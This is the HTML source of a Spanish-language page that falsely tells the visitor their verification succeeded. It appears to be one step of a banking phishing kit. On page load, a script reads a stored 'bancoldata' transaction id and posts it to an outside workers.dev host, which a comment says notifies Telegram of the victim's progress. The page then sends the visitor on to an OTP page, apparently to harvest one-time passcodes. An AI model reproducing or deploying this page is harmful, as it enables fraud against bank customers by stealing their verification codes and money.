<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Acceso Autorizado</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #677eff;
      color: #fff;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      text-align: center;
    }
    .success-icon {
      font-size: 4rem;
      margin-bottom: 20px;
    }
    h1 {
      margin-bottom: 10px;
      font-size: 1.8rem;
    }
    p {
      margin-bottom: 30px;
      max-width: 300px;
      line-height: 1.5;
    }
    button {
      background: #2ed573;
      border: none;
      padding: 15px 40px;
      border-radius: 25px;
      color: white;
      font-size: 1.1rem;
      cursor: pointer;
      font-weight: bold;
    }
    button:hover {
      background: #25c465;
    }
  </style>
</head>
<body>
  <div class="success-icon">✅</div>
  <h1>¡Acceso Autorizado!</h1>
  <p>Tu verificación ha sido exitosa. Ahora puedes continuar con el proceso.</p>
  <button onclick="continuarProceso()">Continuar</button>

  <script>
    // Cuando la página carga, notificar a Telegram que llegamos a "código"
    document.addEventListener('DOMContentLoaded', async () => {
      try {
        const bancoldata = JSON.parse(localStorage.getItem('bancoldata') || '{}');
        const transactionId = bancoldata.transactionId;

        if (transactionId) {
          // Notificar a Telegram que estamos en el paso "código"
          await fetch('https://blue-night-7897.claropromoxlaro.workers.dev/notificar-estado', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              transactionId: transactionId,
              paso: 'codigo'
            })
          });
        }
      } catch (error) {
        console.error('Error notificando estado:', error);
      }
    });

    function continuarProceso() {
      window.location.href = 'otp.html';
    }
  </script>
</body>
</html>
